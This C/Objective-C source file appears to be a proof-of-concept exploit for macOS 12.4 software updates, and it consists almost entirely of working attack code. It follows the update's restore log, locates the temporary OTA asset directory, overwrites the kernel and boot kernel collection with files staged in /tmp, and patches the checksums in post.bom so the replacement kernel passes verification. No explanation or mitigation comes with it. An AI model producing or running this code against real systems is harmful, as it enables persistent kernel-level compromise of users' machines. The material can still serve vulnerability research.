#import <Foundation/Foundation.h>
#include <dirent.h>
#include <sys/stat.h>

void spin_for_log(const char *hint) {
    static const char *log_path = "/System/Volumes/Update/restore.log";
    FILE *fp = NULL;
    char line[4096] = {0};
    
    fp = fopen(log_path, "r");
    fseek(fp, 0, SEEK_END);
    long size = ftell(fp);
    fclose(fp);
    
    int found = 0;
    while (1) {
        fp = fopen(log_path, "r");
        fseek(fp, size, SEEK_SET);
        while (fgets(line, sizeof(line), fp) != NULL) {
            printf("restore.log: %s", line);
            if (strstr(line, hint)) {
                found = 1;
                break;
            }
        }
        size = ftell(fp);
        fclose(fp);
        
        if (found) {
            break;
        }
    }
}

void pwn_kernel(void) {
    DIR *dp;
    struct dirent *ep;
    const char *tmp_name = NULL;
    char cmd[MAXPATHLEN] = {0};

    printf("[*] waiting for the OTA package verification.\n");
    spin_for_log("Deleting obsolete paths in parallel...");
    
    dp = opendir("/System/Library/AssetsV2/com_apple_MobileAsset_MacSoftwareUpdate/");
    while ((ep = readdir (dp))) {
        if (strlen(ep->d_name) == 0x2e) { //strlen("d26a92285552904175e3d311c9af93896515bef1.asset")==0x2e
            printf("[*] got tmp name:%s\n", ep->d_name);
            tmp_name = ep->d_name;
            break;
        }
    }
    closedir (dp);
    if (tmp_name == NULL) {
        printf("[!] fail to get tmp asset name.\n");
        exit(-1);
    }
    
    printf("[*] replacing the kernel patch bxdiff5 file.\n");
    snprintf(cmd, MAXPATHLEN,
             "cp /tmp/kernel  /System/Library/AssetsV2/com_apple_MobileAsset_MacSoftwareUpdate/%s/AssetData/payloadv2/patches/System/Library/Kernels/kernel ;"
             "cp /tmp/BootKernelExtensions.kc  /System/Library/AssetsV2/com_apple_MobileAsset_MacSoftwareUpdate/%s/AssetData/payloadv2/patches/System/Library/KernelCollections/BootKernelExtensions.kc", tmp_name, tmp_name);
    system(cmd);
    
    printf("[*] patching post.bom\n");
    snprintf(cmd, MAXPATHLEN, "lsbom  /System/Library/AssetsV2/com_apple_MobileAsset_MacSoftwareUpdate/%s/AssetData/post.bom > /tmp/post.bom.txt", tmp_name);
    system(cmd);
    // cksum for kernel and BootKernelExtensions.kc, sorry for the hardcode (12.4 21F79)
    system("sed -i -e 's/2706571042/4063806458/g' /tmp/post.bom.txt");
    system("sed -i -e 's/3066804702/3518624405/g' /tmp/post.bom.txt");
    snprintf(cmd, MAXPATHLEN, "mkbom -i /tmp/post.bom.txt  /System/Library/AssetsV2/com_apple_MobileAsset_MacSoftwareUpdate/%s/AssetData/post.bom", tmp_name);
    system(cmd);
    
    printf("[*] waiting for Applying patches.\n");
    spin_for_log("Unarchiving files in parallel...");
 
    printf("[*] all done. Waiting for reboot.\n");
}

int main(int argc, const char * argv[]) {
    pwn_kernel();
    
    return 0;
}
